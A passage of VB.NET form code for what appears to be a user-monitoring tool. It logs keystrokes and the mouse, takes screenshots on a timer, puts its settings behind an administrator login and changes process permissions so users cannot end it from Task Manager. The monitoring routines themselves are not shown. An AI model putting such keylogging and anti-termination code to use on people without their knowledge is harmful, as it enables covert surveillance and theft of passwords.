        txtLog = Now.ToString(DATE_FORMAT + ":")
    End Sub

    Private Sub DisplayWindow()
        DisableSettings() ' protect configuration from non-administrators
        Me.WindowState = FormWindowState.Normal ' restore from being minimised
        Me.Show() ' reveal the window
        Me.BringToFront() ' ensure window appears on top
        Me.TextBox1.Focus() ' start user input on userid field
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        setDeny() ' change permissions on process to present user killing in Task Manager
        DisableSettings() ' ensure only admins can reach settings
        LoadSettings() ' load saved settings
        StartMonitoring() ' log key strokes and mouse
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ' frequency of calls is determined by the user configuration
        SaveScreen() ' take a screen shot
        SaveLog() ' record the key logger buffer
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        ' runs when user right-clicks on system tray icon
        DisplayWindow()
    End Sub

    Private Sub TextBox2_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextBox2.KeyPress
        ' Allow ENTER key to submit the username/password credentials.
        If e.KeyChar = Microsoft.VisualBasic.ChrW(Keys.Enter) Then ' ENTER pressed
            Me.Cursor = Cursors.WaitCursor ' set mouse shape to hourglass
            If ValidateAdmin() Then ' credentials are for a local administrator
                Me.Label4.Visible = False ' ensure any previous "incorrect" credentials are no longer flagged
                EnableSettings() ' provide access to configuration
            Else ' credentials are incorrect or not for a local administrator
                Me.Label4.Visible = True ' display "incorrect" message
            End If
            Me.Cursor = Cursors.Default ' restore mouse shape from hourglass
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        ' image folder dialog response
        Dim result As DialogResult = FolderBrowserDialog1.ShowDialog() ' obtain user response to dialog
        If result = DialogResult.OK Then ' OK pressed
            Label3.Text = FolderBrowserDialog1.SelectedPath ' record the selected path for the image repository
        ElseIf result = DialogResult.Cancel Then ' Cancel pressed. 
            Return
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        ' OK pressed to dismiss user configuration dialog
        SaveSettings()
        Me.Hide()
        Me.WindowState = FormWindowState.Minimized
        DisableSettings()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        ' Cancel pressed to dismiss user configuration dialog
        Me.Hide()
        Me.WindowState = FormWindowState.Minimized
        DisableSettings()
    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        ' respond to user adjusting interval between snapshots
        My.Settings.FreeSpace = TrackBar1.Value
        Me.Label9.Text = TrackBar1.Value
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        ' Exit pressed to dismiss user configuration dialog
        Application.Exit()
    End Sub

    Private Sub TrackBar2_Scroll(sender As Object, e As EventArgs) Handles TrackBar2.Scroll
        ' respond to user adjusting quality of JPEG
        My.Settings.ImageQuality = TrackBar2.Value
        Me.Label10.Text = TrackBar2.Value
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        ' About button
        My.Forms.AboutBox1.ShowDialog(Me)
    End Sub

    Private Sub NotifyIcon1_MouseMove(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseMove
        If Not BalloonUp And ((Now - lastNotified).Ticks >= TimeSpan.TicksPerSecond * 8) Then
            lastNotified = Now
            NotifyIcon1.ShowBalloonTip(8000)
            BalloonUp = True
        End If
    End Sub

    Private Sub NotifyIcon1_BalloonTipClosed(sender As Object, e As EventArgs) Handles NotifyIcon1.BalloonTipClosed
        BalloonUp = False
    End Sub
End Class